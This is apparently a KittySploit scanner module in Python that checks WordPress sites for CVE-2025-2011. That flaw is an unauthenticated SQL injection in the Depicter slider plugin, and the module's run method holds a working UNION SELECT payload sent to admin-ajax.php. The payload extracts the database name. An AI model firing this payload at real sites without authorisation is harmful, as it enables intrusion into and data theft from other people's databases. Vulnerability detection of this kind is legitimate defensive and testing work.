#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Slider & Popup Builder by Depicter plugin for WordPress is vulnerable to generic SQL Injection via the ‘s'."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Slider & Popup Builder by Depicter <= 3.6.1 - Unauthenticated SQL Injection Detection',
        'description': "The Slider & Popup Builder by Depicter plugin for WordPress is vulnerable to generic SQL Injection via the ‘s' parameter in all versions up to, and including, 3.6.1 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp-plugin', 'wp', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://plugins.trac.wordpress.org/browser/depicter/trunk/app/src/Controllers/Ajax/LeadsAjaxController.php?rev=3156664#L179',
            'https://plugins.trac.wordpress.org/browser/depicter/trunk/app/src/Controllers/Ajax/LeadsAjaxController.php?rev=3156664#L23',
            'https://plugins.trac.wordpress.org/browser/depicter/trunk/app/src/Controllers/Ajax/LeadsAjaxController.php?rev=3156664#L49',
            'https://plugins.trac.wordpress.org/browser/depicter/trunk/app/src/Database/Repository/LeadRepository.php?rev=3156664#L224',
            'https://plugins.trac.wordpress.org/browser/depicter/trunk/app/src/Services/LeadService.php?rev=3156664#L82',
        ],
        'cve': 'CVE-2025-2011',
    }

    def run(self):
        path = "/wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Database:', 'commonFields', 'content',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Slider & Popup Builder by Depicter <= 3.6.1 - Unauthenticated SQL Injection detected', path=path)
            return True
        return False

